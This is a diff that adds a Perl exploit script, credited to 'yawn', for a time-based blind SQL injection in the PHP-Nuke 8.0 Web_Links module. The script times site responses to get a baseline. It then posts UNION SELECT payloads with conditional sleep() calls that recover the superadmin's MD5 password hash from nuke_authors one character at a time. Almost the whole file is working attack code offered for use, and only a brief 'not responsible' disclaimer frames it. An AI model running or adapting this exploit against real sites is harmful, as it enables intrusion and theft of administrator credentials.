@@ -1,0 +1,75 @@
+# PHP-Nuke <= 8.0 (Web_Links Module) Remote Blind SQL Injection Exploit
+# Author: yawn
+# Contact Me: http://www.unitx.net
+# E-Mail: yawn@unitx.net
+# Requirements: magic_quotes_gpc : off
+# Greetings: #0day@irc.iside.us | #Unit-X@irc.unitx.net | Dante90
+
+# 	He had but little gold within his suitcase;
+#	But all that he might borrow from a friend
+#	On books and learning he would swiftly spend,
+# 			       -- Geoffrey Chaucer, The Clerk
+
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+
+sub Nuke::Bench {
+	my $hosto = $_;
+        my $website = LWP::UserAgent->new;
+        my $average = 0;
+        print "[+] Calculating average load time (it may take a while) ...\n";
+        for (my $i = 0; $i < 5 ; $i++) {
+                my $bef = time();
+                my $out = $website->get($hosto);
+                my $time = time();
+                $average += int($time-$bef);
+        }
+        return $average/5;
+}
+
+sub Nuke::Usage() {
+        print "[+] Usage: perl nuke.pl <host>\n";
+        print "[+]        the host must be the complete path to modules.php\n";
+        print "[+] Example: perl nuke.pl http://www.site.com/modules.php\n";
+}
+
+sub Nuke::Banner() {
+        print "[+] Remote Blind SQL Injection (Benchmark Mode) PHP-Nuke 8.0\n";
+        print "[+] I'm not responsable for an illegal use of this exploit\n";
+        print "[+] Date: 06-02-2010\n";
+        print "[+] Author: yawn\n";
+}
+Nuke::Banner();
+my $host = shift || die Nuke::Usage();
+$host .= "?name=Web_Links&l_op=Add&title=WTF&description=WTF";
+my $time = Nuke::Bench($host);
+my $attack = LWP::UserAgent->new;
+my $pass = "";
+$attack->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)
+Gecko/20100407 Ubuntu/9.04 (jaunty) Shiretoko/3.5.9');
+my @charset  =  (48..57, 97..102);
+print "[+] Average load time is $time\n";
+print "[+] Trying to exploit the SQL Injection\n";
+
+for (my $j = 1; $j <=32; $j++) {
+	sleep(3);
+	foreach (@charset) {
+		sleep(2);
+		print "[+] Now trying with $_ \n";
+		my $before = time();
+		my $resp = $attack->post($host,
+		{ url => "'/**/UNION SELECT
+IF(SUBSTRING(pwd,$j,1)=CHAR($_),sleep(6),null) FROM nuke_authors WHERE
+radminsuper='1" },
+		Referer => $host);
+		my $after = time();
+		if(int($after-$before) > ($time + 4)) {
+			print "[+] Success with ".chr($_)."\n";
+			$pass .= chr($_);
+			last;
+		}
+	}
+}
+print "[+] MD5 Hash : $pass\n";
